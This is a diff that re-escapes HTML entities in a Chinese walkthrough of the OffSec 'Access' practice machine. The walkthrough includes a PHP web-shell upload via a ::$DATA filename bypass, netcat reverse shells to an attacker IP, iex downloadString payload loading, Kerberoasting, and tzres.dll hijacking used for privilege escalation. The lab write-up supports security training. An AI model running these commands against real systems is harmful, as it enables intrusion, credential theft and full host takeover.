@@ -49,14 +49,14 @@ Nmap done: 1 IP address (1 host up) scanned in 18.97 seconds
 └─$ dnsrecon -d access.offsec -n 192.168.167.187 -t axfr
 [*] Checking for Zone Transfer for access.offsec name servers
 [*] Resolving SOA Record
-[+]      SOA server.access.offsec 192.168.167.187
+[&#43;]      SOA server.access.offsec 192.168.167.187
 [*] Resolving NS Records
 [*] NS Servers found:
-[+]      NS server.access.offsec 192.168.167.187
+[&#43;]      NS server.access.offsec 192.168.167.187
 [*] Removing any duplicate NS server IP Addresses...
 [*]  
 [*] Trying NS server 192.168.167.187
-[+] 192.168.167.187 Has port 53 TCP Open
+[&#43;] 192.168.167.187 Has port 53 TCP Open
 [-] Zone Transfer Failed (Zone transfer error: REFUSED)
 ```
 
@@ -66,7 +66,7 @@ Nmap done: 1 IP address (1 host up) scanned in 18.97 seconds
 
 ```sh
 ┌──(xavier㉿kali)-[~]
-└─$ sudo nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm="access.offsec",userdb="/usr/share/wordlists/seclists/Usernames/Names/names.txt" 192.168.167.187
+└─$ sudo nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=&#34;access.offsec&#34;,userdb=&#34;/usr/share/wordlists/seclists/Usernames/Names/names.txt&#34; 192.168.167.187
 ```
 
 无成果
@@ -105,7 +105,7 @@ Web扫描时发现有
 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Access]
 └─$ dirsearch -x 400,404  -t 500 -e php,ini,txt,bak -u http://192.168.167.187 
 ……
-[00:08:28] 301 -  344B  - /uploads  ->  http://192.168.167.187/uploads/     
+[00:08:28] 301 -  344B  - /uploads  -&gt;  http://192.168.167.187/uploads/     
 [00:08:28] 403 -  304B  - /web.config::$DATA                                
 [00:08:29] 403 -  423B  - /webalizer
 ```
@@ -118,7 +118,7 @@ Web扫描时发现有
 POST /Ticket.php HTTP/1.1
 Host: 192.168.167.187
 User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept: text/html,application/xhtml&#43;xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
 Accept-Encoding: gzip, deflate
 Content-Type: multipart/form-data; boundary=---------------------------29739589853663594743950605566
@@ -129,24 +129,24 @@ Referer: http://192.168.167.187/
 Upgrade-Insecure-Requests: 1
 
 -----------------------------29739589853663594743950605566
-Content-Disposition: form-data; name="your-name"
+Content-Disposition: form-data; name=&#34;your-name&#34;
 
 tst
 -----------------------------29739589853663594743950605566
-Content-Disposition: form-data; name="your-email"
+Content-Disposition: form-data; name=&#34;your-email&#34;
 
 test@test.com
 -----------------------------29739589853663594743950605566
-Content-Disposition: form-data; name="ticket-type"
+Content-Disposition: form-data; name=&#34;ticket-type&#34;
 
 standard-access
 -----------------------------29739589853663594743950605566
-Content-Disposition: form-data; name="the_file"; filename="test.PHP::$DATA"
+Content-Disposition: form-data; name=&#34;the_file&#34;; filename=&#34;test.PHP::$DATA&#34;
 Content-Type:  application/x-php
 
-<?php echo 123; echo system($_REQUEST['cmd']);  ?>
+&lt;?php echo 123; echo system($_REQUEST[&#39;cmd&#39;]);  ?&gt;
 -----------------------------29739589853663594743950605566
-Content-Disposition: form-data; name="submit"
+Content-Disposition: form-data; name=&#34;submit&#34;
 
 Purchase
 -----------------------------29739589853663594743950605566--
@@ -157,7 +157,7 @@ Purchase
 
 ```sh
 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Access]
-└─$ curl "http://192.168.167.187/uploads/test.PHP?cmd=whoami"           
+└─$ curl &#34;http://192.168.167.187/uploads/test.PHP?cmd=whoami&#34;           
 123access\svc_apache
 access\svc_apache 
 ```
@@ -165,10 +165,10 @@ access\svc_apache
 下载nc，并进行反弹shell
 
 ```sh
-cmd=mkdir+C:\tmp\
-cmd=dir+C:\tmp\
-cmd=curl+http://192.168.45.169/nc64.exe+-o+C:\tmp\nc.exe
-cmd=C:\tmp\nc.exe+192.168.45.169+443+-e+powershell
+cmd=mkdir&#43;C:\tmp\
+cmd=dir&#43;C:\tmp\
+cmd=curl&#43;http://192.168.45.169/nc64.exe&#43;-o&#43;C:\tmp\nc.exe
+cmd=C:\tmp\nc.exe&#43;192.168.45.169&#43;443&#43;-e&#43;powershell
 ```
 
 
@@ -181,10 +181,10 @@ connect to [192.168.45.169] from (UNKNOWN) [192.168.167.187] 50217
 Windows PowerShell 
 Copyright (C) Microsoft Corporation. All rights reserved.
 
-PS C:\xampp\htdocs\uploads> whoami
+PS C:\xampp\htdocs\uploads&gt; whoami
 whoami
 access\svc_apache
-PS C:\xampp\htdocs\uploads> 
+PS C:\xampp\htdocs\uploads&gt; 
 ```
 
 
@@ -194,10 +194,10 @@ PS C:\xampp\htdocs\uploads>
 上传工具
 
 ```sh
-PS C:\tmp> curl http://192.168.45.169/winPEASany.exe -o C:\tmp\winPEASany.exe
-PS C:\tmp> dir
+PS C:\tmp&gt; curl http://192.168.45.169/winPEASany.exe -o C:\tmp\winPEASany.exe
+PS C:\tmp&gt; dir
 
-PS C:\tmp> ./winPEASany.exe > 1.txt
+PS C:\tmp&gt; ./winPEASany.exe &gt; 1.txt
 ```
 
 
@@ -207,7 +207,7 @@ PS C:\tmp> ./winPEASany.exe > 1.txt
 在当前用户下没有local.txt文件，注意到还有另一个svc_mssql账户
 
 ```sh
-PS C:\tmp> dir C:\users\
+PS C:\tmp&gt; dir C:\users\
     Directory: C:\users
 
 Mode                LastWriteTime         Length Name
@@ -225,26 +225,26 @@ d-----         4/8/2022   2:40 AM                svc_mssql
 # https://social.technet.microsoft.com/wiki/contents/articles/18996.active-directory-powershell-script-to-list-all-spns-used.aspx
 
 cls
-$search = New-Object DirectoryServices.DirectorySearcher([ADSI]"")
-$search.filter = "(servicePrincipalName=*)"
+$search = New-Object DirectoryServices.DirectorySearcher([ADSI]&#34;&#34;)
+$search.filter = &#34;(servicePrincipalName=*)&#34;
 
-## You can use this to filter for OU's:
-## $results = $search.Findall() | ?{ $_.path -like '*OU=whatever,DC=whatever,DC=whatever*' }
+## You can use this to filter for OU&#39;s:
+## $results = $search.Findall() | ?{ $_.path -like &#39;*OU=whatever,DC=whatever,DC=whatever*&#39; }
 $results = $search.Findall()
 
 foreach( $result in $results ) {
 	$userEntry = $result.GetDirectoryEntry()
-	Write-host "Object Name = " $userEntry.name -backgroundcolor "yellow" -foregroundcolor "black"
-	Write-host "DN      =      "  $userEntry.distinguishedName
-	Write-host "Object Cat. = "  $userEntry.objectCategory
-	Write-host "servicePrincipalNames"
+	Write-host &#34;Object Name = &#34; $userEntry.name -backgroundcolor &#34;yellow&#34; -foregroundcolor &#34;black&#34;
+	Write-host &#34;DN      =      &#34;  $userEntry.distinguishedName
+	Write-host &#34;Object Cat. = &#34;  $userEntry.objectCategory
+	Write-host &#34;servicePrincipalNames&#34;
 
 	$i=1
 	foreach( $SPN in $userEntry.servicePrincipalName ) {
-		Write-host "SPN(" $i ")   =      " $SPN
-		$i+=1
+		Write-host &#34;SPN(&#34; $i &#34;)   =      &#34; $SPN
+		$i&#43;=1
 	}
-	Write-host ""
+	Write-host &#34;&#34;
 }
 ```
 
@@ -253,10 +253,10 @@ foreach( $result in $results ) {
 svc_mssql的SPN为 MSSQLSvc/DC.access.offsec
 
 ```sh
-PS C:\tmp> iwr -uri http://192.168.45.169/Get-SPN.ps1 -o Get-SPN.ps1
+PS C:\tmp&gt; iwr -uri http://192.168.45.169/Get-SPN.ps1 -o Get-SPN.ps1
 iwr -uri http://192.168.45.169/Get-SPN.ps1 -o Get-SPN.ps1
 
-PS C:\tmp> ./Get-SPN.ps1
+PS C:\tmp&gt; ./Get-SPN.ps1
 ./Get-SPN.ps1
 Object Name =  SERVER
 DN      =       CN=SERVER,OU=Domain Controllers,DC=access,DC=offsec
@@ -295,7 +295,7 @@ Object Cat. =  CN=Person,CN=Schema,CN=Configuration,DC=access,DC=offsec
 servicePrincipalNames
 SPN( 1 )   =       MSSQLSvc/DC.access.offsec
 
-PS C:\tmp> 
+PS C:\tmp&gt; 
 
 ```
 
@@ -306,10 +306,10 @@ PS C:\tmp>
 接下去获取`svc_mssql`的票据，使用如下命令将ticket存储在内存中：
 
 ```sh
-PS C:\tmp> Add-Type -AssemblyName System.IdentityModel
+PS C:\tmp&gt; Add-Type -AssemblyName System.IdentityModel
 Add-Type -AssemblyName System.IdentityModel
-PS C:\tmp> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/DC.access.offsec'
-New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/DC.access.offsec'
+PS C:\tmp&gt; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &#39;MSSQLSvc/DC.access.offsec&#39;
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &#39;MSSQLSvc/DC.access.offsec&#39;
 
 
 Id                   : uuid-b4d9ac78-ba0f-45f4-8020-5dec3d5e6101-1
@@ -325,7 +325,7 @@ SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
 利用Empire 的 Invoke-Kerberoast.ps1 导出内存中的Kerberoast hash
 
 ```shell
-PS C:\tmp> iex(new-object net.webclient).downloadString('http://192.168.45.169/Invoke-Kerberoast.ps1'); Invoke-Kerberoast -OutputFormat Hashcat
+PS C:\tmp&gt; iex(new-object net.webclient).downloadString(&#39;http://192.168.45.169/Invoke-Kerberoast.ps1&#39;); Invoke-Kerberoast -OutputFormat Hashcat
 
 
 TicketByteHexStream  : 
@@ -378,12 +378,12 @@ $krb5tgs$23$*svc_mssql$access.offsec$MSSQLSvc/DC.access.offsec*$600077adcf96e989
 
 ### RunasCs
 
-接下去需要获取mssql身份的反弹shell，可以使用"[Invoke-RunasCs.ps1](https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1)"这个脚本
+接下去需要获取mssql身份的反弹shell，可以使用&#34;[Invoke-RunasCs.ps1](https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1)&#34;这个脚本
 
 ```sh
-PS C:\tmp> curl https://raw.githubusercontent.com/antonioCoco/RunasCs/master/Invoke-RunasCs.ps1 -o Invoke-RunasCs.ps1
+PS C:\tmp&gt; curl https://raw.githubusercontent.com/antonioCoco/RunasCs/master/Invoke-RunasCs.ps1 -o Invoke-RunasCs.ps1
 curl https://raw.githubusercontent.com/antonioCoco/RunasCs/master/Invoke-RunasCs.ps1 -o Invoke-RunasCs.ps1
-PS C:\tmp> ls
+PS C:\tmp&gt; ls
 
     Directory: C:\tmp
 
@@ -398,26 +398,26 @@ Mode                LastWriteTime         Length Name
 -a----        1/11/2024   8:49 AM        2029568 winPEASany.exe
 
 
-PS C:\tmp> import-module ./Invoke-RunasCs.ps1
+PS C:\tmp&gt; import-module ./Invoke-RunasCs.ps1
 import-module ./Invoke-RunasCs.ps1
-PS C:\tmp> Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "whoami"
-Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "whoami"
-[*] Warning: The logon for user 'svc_mssql' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.
+PS C:\tmp&gt; Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command &#34;whoami&#34;
+Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command &#34;whoami&#34;
+[*] Warning: The logon for user &#39;svc_mssql&#39; is limited. Use the flag combination --bypass-uac and --logon-type &#39;8&#39; to obtain a more privileged token.
 
 access\svc_mssql
 
-PS C:\tmp> Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "C:\tmp\nc.exe 192.168.45.169 7777 -e powershell"
-Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "C:\tmp\nc.exe 192.168.45.169 7777 -e powershell"
-[*] Warning: The logon for user 'svc_mssql' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.
+PS C:\tmp&gt; Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command &#34;C:\tmp\nc.exe 192.168.45.169 7777 -e powershell&#34;
+Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command &#34;C:\tmp\nc.exe 192.168.45.169 7777 -e powershell&#34;
+[*] Warning: The logon for user &#39;svc_mssql&#39; is limited. Use the flag combination --bypass-uac and --logon-type &#39;8&#39; to obtain a more privileged token.
 
 ```
 
 ![image-20240112021350288](resource/14-W-M-Access.assets/image-20240112021350288.png)
 
 ```sh
-PS C:\Windows\system32> cd C:\users\svc_mssql\Desktop\
+PS C:\Windows\system32&gt; cd C:\users\svc_mssql\Desktop\
 cd C:\users\svc_mssql\Desktop\
-PS C:\users\svc_mssql\Desktop> cat local.txt
+PS C:\users\svc_mssql\Desktop&gt; cat local.txt
 cat local.txt
 ac7cd92298a3ec65de98ea4c51f9e95e
 ```
@@ -431,7 +431,7 @@ ac7cd92298a3ec65de98ea4c51f9e95e
 发现当前用户权限如下：
 
 ```sh
-PS C:\tmp> whoami /priv
+PS C:\tmp&gt; whoami /priv
 whoami /priv
 
 PRIVILEGES INFORMATION
@@ -450,13 +450,13 @@ SeIncreaseWorkingSetPrivilege Increase a process working set   Disabled
 需要用vs stuido手动编译一下
 
 ```sh
-PS C:\tmp> curl http://192.168.45.169/SeManageVolumeAbuse.exe -o SeManageVolumeAbuse.exe
+PS C:\tmp&gt; curl http://192.168.45.169/SeManageVolumeAbuse.exe -o SeManageVolumeAbuse.exe
 curl http://192.168.45.169/SeManageVolumeAbuse.exe -o SeManageVolumeAbuse.exe
 
-PS C:\tmp> ./SeManageVolumeAbuse.exe
+PS C:\tmp&gt; ./SeManageVolumeAbuse.exe
 ./SeManageVolumeAbuse.exe
 Success! Permissions changed.
-PS C:\tmp> icacls C:/windows
+PS C:\tmp&gt; icacls C:/windows
 icacls C:/windows
 C:/windows NT SERVICE\TrustedInstaller:(F)
            NT SERVICE\TrustedInstaller:(CI)(IO)(F)
@@ -473,7 +473,7 @@ C:/windows NT SERVICE\TrustedInstaller:(F)
            APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE)
 
 Successfully processed 1 files; Failed processing 0 files
-PS C:\tmp> 
+PS C:\tmp&gt; 
 ```
 
 接下去要上传 tzres.dll到 C:\Windows\System32\wbem\tzres.dll，再通过systeminfo命令去触发它
@@ -495,20 +495,20 @@ Saved as: tzres.dll
 
 
 ```sh
-PS C:\tmp> curl http://192.168.45.169/tzres.dll -o tzres.dll                                                                          
+PS C:\tmp&gt; curl http://192.168.45.169/tzres.dll -o tzres.dll                                                                          
 curl http://192.168.45.169/tzres.dll -o tzres.dll                                                                                     
-PS C:\tmp> cp tzres.dll C:\Windows\System32\wbem\tzres.dll
+PS C:\tmp&gt; cp tzres.dll C:\Windows\System32\wbem\tzres.dll
 cp tzres.dll C:\Windows\System32\wbem\tzres.dll
-PS C:\tmp> systeminfo > 5.txt
-systeminfo > 5.txt
+PS C:\tmp&gt; systeminfo &gt; 5.txt
+systeminfo &gt; 5.txt
 systeminfo : ERROR: The remote procedure call failed.
 At line:1 char:1
-+ systeminfo > 5.txt
-+ ~~~~~~~~~~~~~~~~~~
-    + CategoryInfo          : NotSpecified: (ERROR: The remote procedure call failed.:String) [], RemoteException
-    + FullyQualifiedErrorId : NativeCommandError
+&#43; systeminfo &gt; 5.txt
+&#43; ~~~~~~~~~~~~~~~~~~
+    &#43; CategoryInfo          : NotSpecified: (ERROR: The remote procedure call failed.:String) [], RemoteException
+    &#43; FullyQualifiedErrorId : NativeCommandError
  
-PS C:\tmp> 
+PS C:\tmp&gt; 
 ```
 
 收到反弹shell：
@@ -521,14 +521,14 @@ connect to [192.168.45.169] from (UNKNOWN) [192.168.167.187] 50960
 Microsoft Windows [Version 10.0.17763.2746]
 (c) 2018 Microsoft Corporation. All rights reserved.
 
-C:\Windows\system32>whoami
+C:\Windows\system32&gt;whoami
 whoami
 nt authority\network service
 
-C:\Windows\system32>cd C:\users\administrator\desktop\
+C:\Windows\system32&gt;cd C:\users\administrator\desktop\
 cd C:\users\administrator\desktop\
 
-C:\Users\Administrator\Desktop>type proof.txt
+C:\Users\Administrator\Desktop&gt;type proof.txt
 type proof.txt
 d0be636ebf08cd4c91a276012f25a135
 
